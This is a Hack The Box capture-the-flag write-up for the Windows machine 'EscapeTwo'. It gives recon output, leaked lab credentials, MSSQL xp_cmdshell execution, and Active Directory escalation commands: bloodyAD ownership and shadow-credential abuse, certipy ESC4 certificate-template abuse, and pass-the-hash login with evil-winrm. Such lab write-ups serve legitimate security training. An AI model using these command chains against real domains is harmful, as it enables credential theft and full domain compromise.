```json
Alias: EscapeTwo
Date: 13-01_2025
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.10.11.51
```

# EscapeTwo
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-13 20:42 PKT
Nmap scan report for 10.10.11.51
Host is up (0.23s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 15:43:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T15:44:32+00:00; +4s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-13T15:44:32+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.51:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.51:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-11T19:02:02
|_Not valid after:  2055-01-11T19:02:02
|_ssl-date: 2025-01-13T15:44:32+00:00; +4s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T15:44:32+00:00; +4s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T15:44:32+00:00; +4s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-01-13T15:43:56
|_  start_date: N/A
|_clock-skew: mean: 3s, deviation: 0s, median: 3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.60 seconds

```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su

In the SMB share `Accounting Department` We can find an `accounts.xslx` file which contains the following passwords

| Username | Password         |
| -------- | ---------------- |
| angela   | 0fwz7Q4mSpurIt99 |
| oscar    | 86LxLBMgEWaKUnBG |
| kevin    | Md9Wlq1E5bZnVDVo |
| sa       | MSSQLP@ssw0rd!   |

Oscar being the only one we can authenticate as to the DC.

| Username | Password         |
| -------- | ---------------- |
| Oscar    | 86LxLBMgEWaKUnBG |

We can also log in to MSSQL using the `sa` account

| Username | Password       |
| -------- | -------------- |
| sa       | MSSQLP@ssw0rd! |

---

# Exploitation

We can get code execution through `mssql` and `xp_cmdshell`. Connect with `mssqlclient.py` and `enable_xp_cmdshell`. Get another shell through it to make life easier.

---

# Lateral Movement

## Local Enumeration

The file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` contains the password for `sql_svc`. 

| Username | Password         |
| -------- | ---------------- |
| sql_svc  | WqSZAF6CysDQbGb3 |

and doing a password spray, we find that Ryan shares the same password

| Username | Password         |
| -------- | ---------------- |
| ryan     | WqSZAF6CysDQbGb3 |



---

# Privilege Escalation

## Local Enumeration

User Ryan has `WriteOwner` Permissions over `ca_svc`,  we can abuse this to takeover that account by

1. Set our self as owner for `ca_svc`
2. Give our self full control over `ca_svc`
3. Change the password for `ca_svc` to something we know.

```bash
bloodyAD --host $IP -u ryan -p WqSZAF6CysDQbGb3 -d sequel set owner ca_svc ryan
bloodyAD --host $IP -u ryan -p WqSZAF6CysDQbGb3 -d sequel add genericAll ca_svc ryan
bloodyAD --host $IP -u ryan -p WqSZAF6CysDQbGb3 -d sequel set password ca_svc 'password123!'
```

But that won't work for long as there is a script that changes the password back every 3 minutes so be fast, otherwise you can't change the password again for 2 days. Luckily we can use another method called shadow credentials to gain `sql_svc`'s hash instead.

I used `bloodyAD` to do so

```bash
bloodyAD --host $IP -u ryan -p WqSZAF6CysDQbGb3 -d sequel add shadowCredentials ca_svc
```

```bash
gettgtpkinit sequel.htb/ca_svc -cert-pem oCx9V5Kh_cert.pem -key-pem oCx9V5Kh_priv.pem oCx9V5Kh.ccache
```

```bash
getnthash -key 'd17dba75f386d5f543b984dddb6c7c86cb9417faf0b68cd28acd47569a8ec528' -dc-ip $IP 'sequel.htb/ca_svc'
```

## Privilege Escalation Vector

Next, run `certipy` on the target and find out that it is vulnerable to `ESC4`. 

```bash
certipy find -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip $IP -stdout -vulnerable
```

That means there is a certificate template used for authentication that we have write access to. We can change it so that we can request for a certificate to authenticate on behalf of the Administrator.

```bash
certipy template -template DunderMifflinAuthentication -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip $IP -debug -scheme ldap
```

request certificate

```bash
certipy req -template DunderMifflinAuthentication -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip $IP -upn administrator@sequel.htb -ca sequel-DC01-CA
```

Get administrator hash

```bash
certipy auth -pfx administrator.pfx
```

| Username      | Hash                             |
| ------------- | -------------------------------- |
| Administrator | 7a8d4e04986afa8ed4060f75e5a0b3ff |

Get code execution

```bash
evil-winrm -i $IP -u Administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

---

# Flags
- baf37eb558d7cd208ac9fe649e2349ad
- b78848a7ae537fdde2623433d5c42e20

#CTF